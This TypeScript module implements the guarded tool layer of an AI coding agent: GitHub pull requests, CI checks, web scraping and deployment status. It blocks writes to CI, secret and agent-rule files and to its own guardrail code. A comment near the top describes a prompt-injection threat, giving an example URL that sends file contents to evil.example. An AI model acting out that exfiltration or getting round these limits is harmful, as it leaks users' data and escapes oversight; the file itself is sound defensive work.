import { decide, type PolicyContext } from "./policy.ts";
import type { DocumentCapability, DocumentReceipt } from "./document-deliverable.ts";

type Fetch = typeof fetch;

export interface ToolCall {
  tool: string;
  input: Record<string, unknown>;
}

export interface ToolResult {
  ok: boolean;
  output: string;
}

export interface ToolEnv {
  githubToken?: string;
  /** This AI's own GitHub token (its GitHub App, src/identity.ts); used instead of githubToken when present. */
  githubAuth?: () => Promise<string | undefined>;
  firecrawlKey?: string;
  vercelToken?: string;
  dryRun: boolean;
  /** ARN-169: explicitly bound synthetic capability; no production default. */
  document?: DocumentCapability;
  documentReceipt?: DocumentReceipt;
  policy: PolicyContext;
  /** Posts a comment on the task being worked (linear.comment). */
  comment: (body: string) => Promise<void>;
  /** Called when a tool is refused for a red-tier reason, so the owner sees it. */
  requestApproval: (reason: string, call: ToolCall) => Promise<void>;
  /**
   * Pages firecrawl.scrape may fetch: links that appeared in the task or in an earlier tool result, matched exactly.
   * Unset = any https page. The engine always sets it (orchestrator `work`), so text in a page or issue can't make an
   * AI send what it has read to an address of the attacker's choosing (e.g. https://evil.example/?d=<file contents>).
   */
  allowedUrls?: Set<string>;
  f?: Fetch;
  /**
   * acp/ branches this task opened in this run (ARN-149). github.update_pull_request writes only to these, so an AI
   * can fix its own PR but never push onto another AI's or a person's branch.
   */
  openedBranches?: Set<string>;
  /**
   * Links of real (not dry-run) pull requests this task opened in this run. A task that ends blocked with one of these
   * is left In Progress instead of Canceled, because Linear's GitHub link closes a canceled task's pull request.
   */
  openedPullRequests?: string[];
  /** Waits between check polls; tests pass a fake so nothing sleeps. */
  sleep?: (ms: number) => Promise<void>;
}

/** Every http(s) link in a text, trailing punctuation removed. */
export function urlsIn(text: string): string[] {
  return [...String(text ?? "").matchAll(/https?:\/\/[^\s<>"'()\[\]{}`]+/g)].map((m) => m[0].replace(/[.,;:!?*_]+$/, ""));
}

const MAX_OUTPUT = 12_000;
const MAX_FILES_PER_READ = 5;
const clip = (s: string) => (s.length > MAX_OUTPUT ? `${s.slice(0, MAX_OUTPUT)}\n…[truncated ${s.length - MAX_OUTPUT} chars]` : s);

function str(input: Record<string, unknown>, key: string): string {
  const v = input[key];
  if (typeof v !== "string" || !v.trim()) throw new Error(`Missing "${key}"`);
  return v.trim();
}

// ---------- pull request input validation (ARN-119, from the ARN-83 review finding F4) ----------

/** Agent branches live under acp/ so they can never be the default branch or a person's branch. */
const BRANCH_RE = /^acp\/[a-z0-9][a-z0-9._-]{0,62}$/;
export const MAX_PR_FILES = 20;
const MAX_PATH = 255;
const SEGMENT_RE = /^[A-Za-z0-9._@+-][A-Za-z0-9 ._@+-]*$/;
export const MAX_FILE_CHARS = 1_000_000;
export const MAX_TITLE_CHARS = 200;
export const MAX_BODY_CHARS = 20_000;
/**
 * Paths an agent may never write: CI and automation config (a PR can run workflows with repository secrets),
 * ownership and security policy, git internals, and environment/secret files.
 */
const PROTECTED: RegExp[] = [
  /^\.github(\/|$)/i,
  /^\.gitlab-ci\.yml$/i,
  /^\.circleci(\/|$)/i,
  /(^|\/)\.git(\/|$)/i,
  /(^|\/)\.gitmodules$/i,
  /(^|\/)\.gitattributes$/i,
  /(^|\/)CODEOWNERS$/i,
  /(^|\/)\.env(rc)?(\.|$)/i,
  /(^|\/)\.npmrc$/i,
  /(^|\/)vercel\.json$/i,
  // Files that run on install, commit or deploy (dependency scripts, git hooks, local Vercel config).
  /(^|\/)package(-lock)?\.json$/i,
  /(^|\/)(npm-shrinkwrap\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb?)$/i,
  /(^|\/)\.husky(\/|$)/i,
  /(^|\/)\.vercel(\/|$)/i,
  // Instruction files that coding agents read as their rules: an agent PR must not rewrite its own (or another AI's) rules.
  // Rule files and rule/hook directories (Windsurf hooks.json can launch local commands).
  /(^|\/)(AGENTS|CLAUDE|GEMINI)(\.local)?\.md$/i,
  /(^|\/)\.(cursorrules|windsurfrules|clinerules|roorules|goosehints)(\/|$)/i,
  /(^|\/)\.(agents|claude|codex|cursor|cline|windsurf|devin|gemini|continue|roo|kiro|amazonq|junie)(\/|$)/i,
  /(^|\/)\.aider[^/]*$/i,
  // The guardrails themselves: an agent PR may never rewrite the code that limits agents (tiers, harm rules, budget,
  // Stop everything, claims, provenance, review check, the approval gate and this file), the database schema, or the
  // owner-facing safety docs. Text an AI read can't talk it into loosening them; a person changes these by hand.
  /^src\/(policy|tools|budget|config|stop-switch|claims|provenance|review-check|identity|orchestrator)\.ts$/i,
  /^api\/_lib\/(workspace-rules|workspace-actions|workspace-memory|workspace-connectors|workspace-plugins|site-auth)\.js$/i,
  /^api\/workspace\.js$/i,
  /^db(\/|$)/i,
  /^docs\/(CODE-OF-CONDUCT|GOVERNANCE)\.md$/i,
];

/** A plain relative path: no empty, ".", ".." or dot/space-terminated segments (".." would climb out of the API path). */
function plainPath(v: unknown, what: string): string {
  if (typeof v !== "string" || !v || v.length > MAX_PATH) throw new Error(`${what} needs a path of 1-255 characters`);
  for (const seg of v.split("/")) {
    if (!seg || seg === "." || seg === ".." || !SEGMENT_RE.test(seg) || seg.endsWith(" ") || seg.endsWith(".")) {
      throw new Error(`${what} path "${v}" is not a plain relative repository path`);
    }
  }
  return v;
}

export function prBranch(v: unknown): string {
  if (typeof v !== "string" || !BRANCH_RE.test(v) || v.includes("..") || v.endsWith(".lock") || v.endsWith(".") || v.includes("/.")) {
    throw new Error('"branch" must look like acp/short-name (lowercase letters, digits, ".", "_" or "-")');
  }
  return v;
}

export function prPath(v: unknown): string {
  const p = plainPath(v, "File");
  if (PROTECTED.some((re) => re.test(p))) throw new Error(`File path "${p}" is protected: agents may not change CI, ownership, git, install-time, secret, agent-instruction or safety-guardrail files`);
  return p;
}

/** One exact find/replace on a file the agent did not rewrite whole (ARN-148). */
export interface FileEdit {
  find: string;
  replace: string;
}
export type PrFile = { path: string; content: string } | { path: string; edits: FileEdit[] };
export const MAX_EDITS_PER_FILE = 40;

/**
 * Files arrive either whole ({path, content}) or as exact edits ({path, edits:[{find, replace}]}). Edits let an AI
 * change a large file without re-sending all of it in one reply; the reply size had capped the engine to small files.
 */
export function prFiles(v: unknown): PrFile[] {
  if (!Array.isArray(v) || !v.length) throw new Error('"files" must be a non-empty array of {path, content} or {path, edits}');
  if (v.length > MAX_PR_FILES) throw new Error(`A pull request may touch at most ${MAX_PR_FILES} files`);
  const seen = new Set<string>();
  return v.map((f) => {
    if (!f || typeof f !== "object") throw new Error("Each file needs path and content, or path and edits");
    const hasContent = typeof f.content === "string";
    const hasEdits = f.edits !== undefined;
    if (hasContent === hasEdits) throw new Error("Each file needs path and content, or path and edits (not both)");
    const path = prPath(f.path);
    const key = path.toLowerCase();
    if (seen.has(key)) throw new Error(`File path "${path}" appears more than once`);
    seen.add(key);
    if (hasContent) {
      if (f.content.length > MAX_FILE_CHARS) throw new Error(`File content may be at most ${MAX_FILE_CHARS} characters`);
      return { path, content: f.content };
    }
    if (!Array.isArray(f.edits) || !f.edits.length) throw new Error(`"edits" for ${path} must be a non-empty array of {find, replace}`);
    if (f.edits.length > MAX_EDITS_PER_FILE) throw new Error(`At most ${MAX_EDITS_PER_FILE} edits per file`);
    const edits = f.edits.map((e: any, i: number) => {
      if (!e || typeof e.find !== "string" || !e.find || typeof e.replace !== "string") {
        throw new Error(`Edit ${i + 1} for ${path} needs a non-empty "find" and a "replace" string`);
      }
      if (e.find.length > MAX_FILE_CHARS || e.replace.length > MAX_FILE_CHARS) throw new Error(`Edit ${i + 1} for ${path} is too large`);
      return { find: e.find, replace: e.replace };
    });
    return { path, edits };
  });
}

/**
 * Applies edits in order. Each "find" must occur exactly once in the text as it stands at that point, so an edit can
 * never land in the wrong place silently; a miss or an ambiguous match fails the whole file before anything is written.
 */
export function applyEdits(path: string, base: string, edits: FileEdit[]): string {
  let text = base;
  edits.forEach((e, i) => {
    const at = text.indexOf(e.find);
    if (at < 0) throw new Error(`Edit ${i + 1} for ${path}: "find" text not found. Read the file again and copy the text exactly`);
    if (text.indexOf(e.find, at + 1) >= 0) throw new Error(`Edit ${i + 1} for ${path}: "find" text appears more than once; include more surrounding lines`);
    text = text.slice(0, at) + e.replace + text.slice(at + e.find.length);
  });
  if (text.length > MAX_FILE_CHARS) throw new Error(`File content may be at most ${MAX_FILE_CHARS} characters`);
  return text;
}

/** Line numbers for github.read_file's optional range (1-based, inclusive). */
export const MAX_READ_LINES = 400;
export function lineRange(input: Record<string, unknown>): { from: number; to: number } | null {
  const { from, to } = input;
  if (from === undefined && to === undefined) return null;
  const a = from === undefined ? 1 : Number(from);
  const b = to === undefined ? a + MAX_READ_LINES - 1 : Number(to);
  if (!Number.isInteger(a) || !Number.isInteger(b) || a < 1 || b < a) throw new Error('"from" and "to" must be whole line numbers with from <= to');
  return { from: a, to: Math.min(b, a + MAX_READ_LINES - 1) };
}

/** Returns the asked lines with a header naming the span, so the AI knows where it is in a long file. */
export function sliceLines(text: string, r: { from: number; to: number }): string {
  const lines = text.split("\n");
  const end = Math.min(r.to, lines.length);
  if (r.from > lines.length) return `[file has ${lines.length} lines; nothing at line ${r.from}]`;
  return `[lines ${r.from}-${end} of ${lines.length}]\n${lines.slice(r.from - 1, end).join("\n")}`;
}

const encodePath = (p: string) => p.split("/").map(encodeURIComponent).join("/");

/** Reads may target the repository root (empty path) or any plain relative path; never ".." (ARN-119 review F1). */
export function readPath(v: unknown): string {
  if (v === undefined || v === "") return "";
  return plainPath(typeof v === "string" ? v.replace(/\/+$/, "") : v, "Read");
}

/** A git ref passed as a single URL segment: "." or ".." would be normalised into a different API path. */
export function gitRef(v: unknown, fallback: string): string {
  if (v === undefined) return fallback;
  if (typeof v !== "string" || !v.trim() || v.length > 255 || /^\.{1,2}$/.test(v.trim()) || /[\u0000-\u001f\u007f]/.test(v)) {
    throw new Error('"ref" must be a branch, tag or commit name');
  }
  return v.trim();
}

async function gh(env: ToolEnv, path: string, init: RequestInit = {}): Promise<any> {
  const token = env.githubAuth ? await env.githubAuth() : env.githubToken;
  if (!token) throw new Error("GITHUB_TOKEN is not set");
  const res = await (env.f ?? fetch)(`https://api.github.com${path}`, {
    ...init,
    headers: {
      accept: "application/vnd.github+json",
      authorization: `Bearer ${token}`,
      "x-github-api-version": "2022-11-28",
      ...(init.body ? { "content-type": "application/json" } : {}),
    },
    signal: AbortSignal.timeout(30_000),
  });
  const j: any = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(`GitHub ${res.status}: ${j.message ?? "request failed"}`);
  return j;
}

async function firecrawl(env: ToolEnv, path: string, body: unknown): Promise<any> {
  if (!env.firecrawlKey) throw new Error("FIRECRAWL_API_KEY is not set");
  const res = await (env.f ?? fetch)(`https://api.firecrawl.dev${path}`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${env.firecrawlKey}` },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(90_000),
  });
  const j: any = await res.json().catch(() => ({}));
  if (!res.ok || j.success === false) throw new Error(`Firecrawl ${res.status}: ${j.error ?? "request failed"}`);
  return j;
}


/** Turns validated files into full contents, applying edits to the copy on `ref`. Reads only; throws before any write. */
async function resolveFiles(env: ToolEnv, repo: string, ref: string, parsed: PrFile[]): Promise<{ path: string; content: string }[]> {
  const files: { path: string; content: string }[] = [];
  for (const f of parsed) {
    if ("content" in f) {
      files.push(f);
      continue;
    }
    let current: any;
    try {
      current = await gh(env, `/repos/${repo}/contents/${encodePath(f.path)}?ref=${encodeURIComponent(ref)}`);
    } catch (e) {
      throw new Error(`Cannot edit ${f.path}: it could not be read from ${ref} (${(e as Error).message}). Send the whole file as "content" to create it`);
    }
    if (Array.isArray(current) || typeof current?.content !== "string") throw new Error(`Cannot edit ${f.path}: it is not a file`);
    files.push({ path: f.path, content: applyEdits(f.path, Buffer.from(current.content, "base64").toString("utf8"), f.edits) });
  }
  return files;
}

/** Writes files onto a branch, one commit each (the contents API). */
async function writeFiles(env: ToolEnv, repo: string, branch: string, files: { path: string; content: string }[], message: string): Promise<void> {
  for (const file of files) {
    const path = encodePath(file.path);
    let sha: string | undefined;
    try {
      sha = (await gh(env, `/repos/${repo}/contents/${path}?ref=${encodeURIComponent(branch)}`)).sha;
    } catch {
      sha = undefined;
    }
    await gh(env, `/repos/${repo}/contents/${path}`, {
      method: "PUT",
      body: JSON.stringify({ message, content: Buffer.from(file.content).toString("base64"), branch, ...(sha ? { sha } : {}) }),
    });
  }
}

export const CHECK_WAIT_MS = 240_000;
const CHECK_POLL_MS = 15_000;
/** A check that actually ran: still going, or finished as anything but skipped/neutral. */
const isRealCheck = (r: any) => r.status !== "completed" || (r.conclusion !== "skipped" && r.conclusion !== "neutral");
const FAIL_LINE = /not ok|error|fail|✖|assert/i;

/** The lines of a failed job's log that say what broke, plus its tail; logs are untrusted text like any tool output. */
export function failureExcerpt(log: string): string {
  const lines = log.replace(/\r/g, "").split("\n").map((l) => l.replace(/^\d{4}-\d\d-\d\dT[\d:.]+Z /, ""));
  const hits = lines.filter((l) => FAIL_LINE.test(l)).slice(0, 40);
  const tail = lines.slice(-25);
  return [...hits, "…", ...tail].join("\n").slice(0, 4_000);
}

async function jobLog(env: ToolEnv, repo: string, jobId: number): Promise<string> {
  const token = env.githubAuth ? await env.githubAuth() : env.githubToken;
  const res = await (env.f ?? fetch)(`https://api.github.com/repos/${repo}/actions/jobs/${jobId}/logs`, {
    headers: { accept: "application/vnd.github+json", authorization: `Bearer ${token}`, "x-github-api-version": "2022-11-28" },
    signal: AbortSignal.timeout(30_000),
  });
  if (!res.ok) throw new Error(`log unavailable (${res.status})`);
  return res.text();
}

const HANDLERS: Record<string, (input: Record<string, unknown>, env: ToolEnv) => Promise<string>> = {
  async "github.read_file"(input, env) {
    const repo = str(input, "repo");
    const path = readPath(input["path"]);
    const ref = input["ref"] === undefined ? "" : `?ref=${encodeURIComponent(gitRef(input["ref"], ""))}`;
    const range = lineRange(input);
    const j = await gh(env, `/repos/${repo}/contents/${encodePath(path)}${ref}`);
    if (Array.isArray(j)) return j.map((e: any) => `${e.type}\t${e.path}`).join("\n");
    const text = Buffer.from(j.content ?? "", "base64").toString("utf8");
    if (range) return sliceLines(text, range);
    // A long file would be cut at the output limit with no way to see the rest; say how to page through it.
    if (text.length > MAX_OUTPUT) {
      const n = text.split("\n").length;
      return `${text.slice(0, MAX_OUTPUT - 300)}\n…[file is ${text.length} characters, ${n} lines; read the rest with "from" and "to" line numbers, at most ${MAX_READ_LINES} lines per read]`;
    }
    return text;
  },
  async "github.read_files"(input, env) {
    const paths = input["paths"];
    if (!Array.isArray(paths) || paths.length === 0 || paths.length > MAX_FILES_PER_READ || !paths.every((p) => typeof p === "string")) {
      throw new Error(`"paths" must list 1 to ${MAX_FILES_PER_READ} file paths`);
    }
    // Each file gets an even share of the output, so one big file can't hide the others; a cut file says how to page.
    const share = Math.floor(MAX_OUTPUT / paths.length) - 200;
    const parts: string[] = [];
    for (const path of paths as string[]) {
      let text: string;
      try {
        text = await HANDLERS["github.read_file"]!({ repo: input["repo"], path, ...(input["ref"] === undefined ? {} : { ref: input["ref"] }) }, env);
      } catch (e) {
        text = `ERROR: ${(e as Error).message}`;
      }
      if (text.length > share) {
        text = `${text.slice(0, share)}\n…[cut here; read the rest with github.read_file and "from"/"to" line numbers]`;
      }
      parts.push(`=== ${path} ===\n${text}`);
    }
    return parts.join("\n\n");
  },
  async "github.list_tree"(input, env) {
    const repo = str(input, "repo");
    const ref = gitRef(input["ref"], "HEAD");
    const j = await gh(env, `/repos/${repo}/git/trees/${encodeURIComponent(ref)}?recursive=1`);
    return (j.tree ?? []).filter((t: any) => t.type === "blob").map((t: any) => t.path).join("\n");
  },
  async "github.search_issues"(input, env) {
    const repo = str(input, "repo");
    const q = str(input, "query");
    const j = await gh(env, `/search/issues?q=${encodeURIComponent(`${q} repo:${repo}`)}&per_page=20`);
    return (j.items ?? []).map((i: any) => `#${i.number} [${i.state}] ${i.title} ${i.html_url}`).join("\n") || "No results";
  },
  async "github.open_pull_request"(input, env) {
    const repo = str(input, "repo");
    const title = str(input, "title");
    const body = typeof input["body"] === "string" ? input["body"] : "";
    if (title.length > MAX_TITLE_CHARS || /[\r\n]/.test(title)) throw new Error(`"title" must be one line of at most ${MAX_TITLE_CHARS} characters`);
    if (body.length > MAX_BODY_CHARS) throw new Error(`"body" may be at most ${MAX_BODY_CHARS} characters`);
    // Everything is validated before any GitHub call, dry run included (ARN-119).
    const branch = prBranch(input["branch"]);
    const parsed = prFiles(input["files"]);
    const edited = parsed.filter((f) => "edits" in f);
    // Reads only up to here. Edits are applied to the default branch's copy and checked before any write, so a dry
    // run proves they apply and a live run never leaves a half-written branch because one edit missed.
    let base: string | undefined;
    if (!env.dryRun || edited.length) {
      const repoInfo = await gh(env, `/repos/${repo}`);
      base = repoInfo.default_branch as string;
      if (typeof base !== "string" || !base || base === branch) throw new Error("Agents may not write to the default branch");
    }
    const files = await resolveFiles(env, repo, base!, parsed);
    if (env.dryRun) {
      env.openedBranches?.add(`${repo}#${branch}`);
      const checked = edited.length ? `; all ${edited.reduce((n, f) => n + ("edits" in f ? f.edits.length : 0), 0)} edit(s) apply cleanly` : "";
      return `DRY RUN: would open PR "${title}" on ${repo} from ${branch} touching ${files.length} file(s)${checked}`;
    }
    if (!base) throw new Error("Default branch unknown");
    const baseRef = await gh(env, `/repos/${repo}/git/ref/heads/${encodeURIComponent(base)}`);
    // Creating the ref fails if the branch already exists, so an agent can never write onto someone else's branch.
    await gh(env, `/repos/${repo}/git/refs`, { method: "POST", body: JSON.stringify({ ref: `refs/heads/${branch}`, sha: baseRef.object.sha }) });
    await writeFiles(env, repo, branch, files, `${title}\n\nOpened by AI Command Post`);
    const pr = await gh(env, `/repos/${repo}/pulls`, { method: "POST", body: JSON.stringify({ title, head: branch, base, body, draft: true }) });
    env.openedBranches?.add(`${repo}#${branch}`);
    env.openedPullRequests?.push(String(pr.html_url ?? `${repo}#${pr.number}`));
    return `Opened draft PR #${pr.number}: ${pr.html_url}\nNext: call github.pr_checks with {"repo":"${repo}","pr":${pr.number}} and fix any failure with github.update_pull_request before reporting done.`;
  },
  async "github.update_pull_request"(input, env) {
    const repo = str(input, "repo");
    const branch = prBranch(input["branch"]);
    const message = str(input, "message");
    if (message.length > MAX_TITLE_CHARS || /[\r\n]/.test(message)) throw new Error(`"message" must be one line of at most ${MAX_TITLE_CHARS} characters`);
    const parsed = prFiles(input["files"]);
    if (!env.openedBranches?.has(`${repo}#${branch}`)) {
      throw new Error(`You may only update a pull request this task opened in this run; ${branch} is not one of them`);
    }
    if (env.dryRun) return `DRY RUN: would push ${parsed.length} file(s) to ${branch} on ${repo}`;
    // Edits apply to the branch as it stands now, so a fix builds on the PR's earlier commits.
    const files = await resolveFiles(env, repo, branch, parsed);
    await writeFiles(env, repo, branch, files, `${message}\n\nUpdated by AI Command Post`);
    return `Pushed ${files.length} file(s) to ${branch}. Call github.pr_checks again to see the new results.`;
  },
  async "github.pr_checks"(input, env) {
    const repo = str(input, "repo");
    const n = Number(input["pr"]);
    if (!Number.isInteger(n) || n < 1) throw new Error('"pr" must be a pull request number');
    const sleep = env.sleep ?? ((ms: number) => new Promise<void>((r) => setTimeout(r, ms)));
    const pr = await gh(env, `/repos/${repo}/pulls/${n}`);
    const sha = String(pr.head?.sha ?? "");
    if (!/^[0-9a-f]{40}$/.test(sha)) throw new Error("Pull request head commit unknown");
    // Waiting costs no model tokens: the tool polls until the checks have settled or the wait runs out.
    // Checks register one by one, and an app check can finish as "skipped" before the test run even appears, so a
    // result counts only when at least one real (not skipped) check has finished, nothing is still running, and the
    // same checks were there on the poll before (nothing new turned up in between).
    let runs: any[] = [];
    let before = "";
    for (let waited = 0; ; waited += CHECK_POLL_MS) {
      runs = (await gh(env, `/repos/${repo}/commits/${sha}/check-runs?per_page=50`)).check_runs ?? [];
      const names = runs.map((r) => `${r.id}:${r.status}`).sort().join(",");
      const settled = runs.some(isRealCheck) && runs.every((r) => r.status === "completed") && names === before;
      if (settled || waited >= CHECK_WAIT_MS) break;
      before = names;
      await sleep(CHECK_POLL_MS);
    }
    if (!runs.length) return `PR #${n} (${sha.slice(0, 7)}): no checks have started yet. Call github.pr_checks again; do not report done or blocked on this.`;
    if (!runs.some(isRealCheck)) {
      return `PR #${n} (${sha.slice(0, 7)}): no real checks have run yet (only skipped: ${runs.map((r) => r.name).join(", ")}). Call github.pr_checks again; do not report done or blocked on this.`;
    }
    const bad = new Set(["failure", "timed_out", "cancelled", "action_required", "startup_failure"]);
    const out: string[] = [];
    for (const r of runs) {
      const state = r.status === "completed" ? r.conclusion : r.status;
      out.push(`- ${r.name}: ${state}`);
      if (r.status === "completed" && bad.has(r.conclusion)) {
        if (r.output?.title || r.output?.summary) out.push(`  ${String(r.output?.title ?? "")} ${String(r.output?.summary ?? "").slice(0, 800)}`.trimEnd());
        if (r.app?.slug === "github-actions") {
          try {
            out.push(failureExcerpt(await jobLog(env, repo, r.id)));
          } catch (e) {
            out.push(`  (${(e as Error).message})`);
          }
        }
      }
    }
    const done = runs.every((r) => r.status === "completed");
    const green = done && runs.every((r) => !bad.has(r.conclusion));
    const verdict = !done ? "STILL RUNNING after the wait" : green ? "ALL PASSED" : "FAILED";
    return `PR #${n} at ${sha.slice(0, 7)}: ${verdict}\n${out.join("\n")}`;
  },
  async "firecrawl.search"(input, env) {
    const query = str(input, "query");
    // Firecrawl calls spend account credits, so a dry run never makes one.
    if (env.dryRun) return `DRY RUN: would search the web for "${query}"`;
    const j = await firecrawl(env, "/v2/search", { query, limit: Math.min(Number(input["limit"] ?? 5), 10) });
    const web = j.data?.web ?? j.data ?? [];
    return (Array.isArray(web) ? web : []).map((r: any) => `- ${r.title ?? ""} ${r.url}\n  ${r.description ?? ""}`).join("\n") || "No results";
  },
  async "firecrawl.scrape"(input, env) {
    const url = str(input, "url");
    if (!/^https:\/\//.test(url)) throw new Error("Only https URLs may be scraped");
    if (env.allowedUrls && !env.allowedUrls.has(url)) {
      throw new Error("Only links that appeared in the task or in an earlier search or page may be fetched; this one did not");
    }
    if (env.dryRun) return `DRY RUN: would fetch ${url}`;
    const j = await firecrawl(env, "/v2/scrape", { url, formats: ["markdown"], onlyMainContent: true });
    return j.data?.markdown ?? "";
  },
  async "document.create"(input, env) {
    if (!env.document || env.dryRun) throw new Error("Private document capability unavailable");
    env.documentReceipt = undefined;
    const r = await env.document.create(input);
    if (!await env.document.verify(r)) throw new Error("Private document bytes not independently confirmed by storage readback");
    env.documentReceipt = r;
    return JSON.stringify({artifactId:r.artifactId,filename:r.filename,mime:r.mime,bytes:r.bytes,sha256:r.sha256});
  },
  async "linear.comment"(input, env) {
    const body = str(input, "body");
    await env.comment(body);
    return env.dryRun ? "DRY RUN: comment logged" : "Comment posted";
  },
};

async function vercel(env: ToolEnv, path: string): Promise<any> {
  if (!env.vercelToken) throw new Error("VERCEL_API_KEY is not set");
  const res = await (env.f ?? fetch)(`https://api.vercel.com${path}`, {
    headers: { authorization: `Bearer ${env.vercelToken}` },
    signal: AbortSignal.timeout(30_000),
  });
  const j: any = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(`Vercel ${res.status}: ${JSON.stringify(j.error ?? j).slice(0, 300)}`);
  return j;
}

HANDLERS["vercel.list_deployments"] = async (input, env) => {
  const q = new URLSearchParams({ limit: String(Math.min(Number(input["limit"] ?? 10), 20)) });
  if (typeof input["project"] === "string") q.set("projectId", input["project"]);
  if (typeof input["teamId"] === "string") q.set("teamId", input["teamId"]);
  const j = await vercel(env, `/v6/deployments?${q}`);
  return (j.deployments ?? []).map((d: any) => `- ${d.uid} ${d.name} ${d.state ?? d.readyState} ${d.target ?? "preview"} https://${d.url} ${new Date(d.created).toISOString()}`).join("\n") || "No deployments";
};
HANDLERS["vercel.deployment_status"] = async (input, env) => {
  const id = str(input, "id");
  const q = typeof input["teamId"] === "string" ? `?teamId=${encodeURIComponent(input["teamId"])}` : "";
  const d = await vercel(env, `/v13/deployments/${encodeURIComponent(id)}${q}`);
  return `${d.name} ${d.readyState} ${d.target ?? "preview"} https://${d.url}${d.errorMessage ? `\nError: ${d.errorMessage}` : ""}`;
};

export const TOOL_DOCS: Record<string, string> = {
  "github.read_file": '{"repo":"owner/name","path":"src/x.ts","ref?":"branch","from?":1,"to?":400} — read a file (or lines from-to of a long one, up to 400 per read) or list a directory',
  "github.list_tree": '{"repo":"owner/name","ref?":"branch"} — list every file path',
  "github.read_files": '{"repo":"owner/name","paths":["a.ts","b.html"],"ref?":"branch"} — read up to 5 files in one call (each shares the output limit; page long ones with github.read_file)',
  "github.search_issues": '{"repo":"owner/name","query":"text"} — search issues and PRs',
  "github.open_pull_request":
    '{"repo":"owner/name","branch":"acp/short-name","title":"...","body":"...","files":[{"path":"new/or/small.ts","content":"full file content"},{"path":"existing/big.ts","edits":[{"find":"exact existing text, unique in the file","replace":"new text"}]}]} — open a DRAFT pull request; never merges. Prefer edits for existing files: each find must match the current file exactly once',
  "github.pr_checks": '{"repo":"owner/name","pr":123} — wait (up to 4 minutes) for a pull request\'s checks and report each result, with failing log lines',
  "github.update_pull_request":
    '{"repo":"owner/name","branch":"acp/short-name","message":"one-line commit message","files":[same shape as open_pull_request]} — push a fix to a PR you opened in this task; edits apply to the branch as it is now',
  "firecrawl.search": '{"query":"text","limit?":5} — web search',
  "firecrawl.scrape": '{"url":"https://..."} — fetch one page as markdown',
  "linear.comment": '{"body":"markdown"} — post a progress note on your task',
  "document.create": '{"filename":"report.docx","title":"Report","sections":[{"heading":"Summary","paragraphs":["Text"]}]} — create one private DOCX deliverable and return its verified receipt; only when explicitly available',
  "vercel.list_deployments": '{"project?":"name or id","teamId?":"team_...","limit?":10} — list recent Vercel deployments (read-only)',
  "vercel.deployment_status": '{"id":"dpl_... or url","teamId?":"team_..."} — state and error of one deployment (read-only)',
};

export function currentDocumentReceipt(env: ToolEnv): DocumentReceipt | undefined { return env.documentReceipt; }

export async function runTool(call: ToolCall, allowed: string[], env: ToolEnv): Promise<ToolResult> {
  if (!allowed.includes(call.tool)) return { ok: false, output: `Tool ${call.tool} is not available to this agent` };
  const handler = Object.hasOwn(HANDLERS, call.tool) ? HANDLERS[call.tool] : undefined;
  if (!handler) return { ok: false, output: `Unknown tool ${call.tool}` };
  const d = decide(call.tool, call.input ?? {}, env.policy);
  if (!d.allow) {
    if (d.tier === "red") await env.requestApproval(d.reason, call);
    return { ok: false, output: `BLOCKED: ${d.reason}` };
  }
  try {
    return { ok: true, output: clip(await handler(call.input ?? {}, env)) };
  } catch (e) {
    return { ok: false, output: `ERROR: ${(e as Error).message}` };
  }
}
